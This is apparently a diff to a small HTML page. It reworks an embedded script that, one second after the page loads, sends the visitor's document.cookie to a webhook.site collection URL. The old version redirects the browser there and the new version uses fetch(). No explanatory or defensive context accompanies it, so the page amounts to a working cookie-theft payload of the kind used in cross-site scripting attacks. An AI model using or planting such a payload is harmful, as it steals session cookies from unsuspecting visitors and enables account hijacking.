@@ -1,6 +1,10 @@
 <html>
-    <head></head>
-    <body>
-        <script>setTimeout(() => {location.href='https://webhook.site/f88fe7ba-97e6-4466-aa3d-50c547f7ac1d?' + document.cookie}, 1000)</script>
-    </body>
+  <head></head>
+  <body>
+    <script>
+      setTimeout(() => {
+        fetch('https://webhook.site/f88fe7ba-97e6-4466-aa3d-50c547f7ac1d?cookie=' + encodeURIComponent(document.cookie));
+      }, 1000);
+    </script>
+  </body>
 </html>
